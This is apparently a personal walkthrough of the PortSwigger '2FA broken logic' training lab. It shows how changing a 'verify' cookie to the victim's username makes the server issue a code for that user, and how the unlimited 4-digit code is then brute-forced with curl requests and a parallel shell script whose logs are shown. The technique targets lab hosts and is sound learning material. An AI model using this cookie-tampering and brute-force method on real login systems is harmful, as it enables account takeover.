# Lab: 2FA broken logic
Level: #Practitioner 

## Description
Taken from the [portswigger lab](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic):

*This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.*

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`

*You also have access to the email server to receive your 2FA verification code.*


#### Tools
- [Cookie editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/)


## Enumeration
When Access de lab it would run a website in a random subdomain with the following structure:

`https://[random-32-hex-value].web-security-academy.net/`
The first  page's section looks like:
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net
```
![index](04-🛬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/index.png)

Go to the `My account` send me to `/login` view:
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net/login
```
![login](04-🛬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/login.png)

Since I have the `wiener:peter` credentials from the lab's description, I am gonna using to check that it redirects to `/login2`.
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net/login2
```
![login2](04-🛬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/login2.png)

And to see the security code they provime it with a `Email clien` buttom that send me to the following `/email` view.
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net/email
```
![email](email.png)

If I use that code, it redirects me to `/my-account`
```
https://0aa80033042384adc0fb6b5e000100c2.web-security-academy.net/my-account
```
![my-account](04-🛬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/my-account.png)

But somethings strange and probably one of the flawed logic is that if I go directly to `/login2` it send me to the verify code view, but at this point you surely are ask you "How the server know who to send the code?" and the answer as well as you are thinking. It is in the cookie!

Using [Cookie editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) firefox addon (to see and modify the cookies confortably) note that there is a `verify` cookie with the `wiener` name.
![cookieEditor](02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/cookieEditor.png)

If i check the wiener email in `/email` there is a lot of verification  codes for each GET request to `/login2`.

Then, the name i put in the `verify` cookie will recieve the verify code. So now check how many times the server allow me try the code. But fortunally to me, there is no limit, only return a `Incorrect security code` error message. So to bruteforce!


## Foothold

Well, before to bruteforce first check the requests manually:

GET requests to ensure verification code is send to email (test with `wiener` user.
```shell
$ curl -s "https://0a370060031c8605c053707000e5000a.web-security-academy.net/login2" -b "verify=wiener" 
```

Now to POST request with a incorrect security code check witch name has the parameter:![inspector](04-🛬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/inspector.png)

And add it in the `curl` with `--data-raw` with a random code, and get the `Incorrect security code`
```shell
$ curl -s "https://0a370060031c8605c053707000e5000a.web-security-academy.net/login2" -b "verify=wiener" --data-raw "mfa-code=1234"

<!DOCTYPE html>                                                                                                                                             <html>                                                                                                                                                          <head>
...SNIP...
                    <form class=login-form method=POST>                                                                                                                         <p class=is-warning>Incorrect security code</p>                                                                                                                 <label>Please enter your 4-digit security code</label>                                                                                                      <input required type=text name=mfa-code>                                                                                                                    <button class=button type=submit> Login </button>                                                                                                       </form>                                                                                                                                                 </div>                                                                                                                                                  </section>                                                                                                                                              </div>                                                                                                                                                  </body>                                                                                                                                                 </html>  
```

And with the correct code it redirects to  `/my-account`

In this way I need automatizate the process to check every guess between 0-9999. Since i know there will be the same code in every attemp. only I am going to to a loop between that range until hit the correct value.

## Script

I wrote the script  `.sh` . which has the username like argument. If I test it with `wiener` to get the code in the `/email` view:

```shell
$ ./bruteForce2FA.sh > output.txt
```

I redirect the script STDOUT to the `output.txt` file. In this way I can save the total data and analize it. In this case in another shell I use `tail`  to see the last lineas and use `-f`  switch  to interactive see each update.

```shell
$ tail output.txt -f 
...SNIP...
200 | time:0.760854 | bytes:2899 | words:144 | lines:58 | guess:1214                                                                                        200 | time:0.730513 | bytes:2899 | words:144 | lines:58 | guess:1220                                                                                        200 | time:0.722090 | bytes:2899 | words:144 | lines:58 | guess:1224                                                                                        200 | time:0.725983 | bytes:2899 | words:144 | lines:58 | guess:1225                                                                                        200 | time:0.725443 | bytes:2899 | words:144 | lines:58 | guess:1230                                                                                        302 | time:0.761954 | bytes:1 | words:0 | lines:1 | guess:1227                                                                                              Find it code: 1227                                                                                                                                          200 | time:0.919809 | bytes:2899 | words:144 | lines:58 | guess:1210                                                                                        200 | time:0.980081 | bytes:2899 | words:144 | lines:58 | guess:1215                                                                                        200 | time:0.948560 | bytes:2899 | words:144 | lines:58 | guess:1222  
```


Now again but with the `carlos` name in the cookie `verify` 
```shell
$ ./bruteForce2FA.sh > output.txt
```

```shell
$ tail output.txt -f 
200 | time:0.708798 | bytes:2899 | words:144 | lines:58 | guess:0313                                                                                        200 | time:0.711823 | bytes:2899 | words:144 | lines:58 | guess:0314                                                                                        200 | time:0.742138 | bytes:2899 | words:144 | lines:58 | guess:0310                                                                                        200 | time:0.720293 | bytes:2899 | words:144 | lines:58 | guess:0315                                                                                        200 | time:0.752272 | bytes:2899 | words:144 | lines:58 | guess:0311                                                                                        200 | time:0.705151 | bytes:2899 | words:144 | lines:58 | guess:0319                                                                                        200 | time:0.718562 | bytes:2899 | words:144 | lines:58 | guess:0318                                                                                        200 | time:0.758934 | bytes:2899 | words:144 | lines:58 | guess:0312                                                                                        200 | time:0.713097 | bytes:2899 | words:144 | lines:58 | guess:0320                                                                                        302 | time:0.703924 | bytes:1 | words:0 | lines:1 | guess:0324                                                                                              Find it code: 0324    
```

![solved](04-🛬proyectos/repos/portswiggerLabs/02-Authentication/02-Multi-factor/02-2FA-broken-logic/img/solved.png)

### Notes

- To enter the code in the browser you have to have the `/login2` view open previously to avoid overwrite the security code. (or only catch the cookie session and use that in the cooki to `/my-accoynt` view)
- Since script execute mulitples process in paralell, maybe we dont see the string `Find it! password...` in the last line. But the script will stop so only we need to check where is the message.


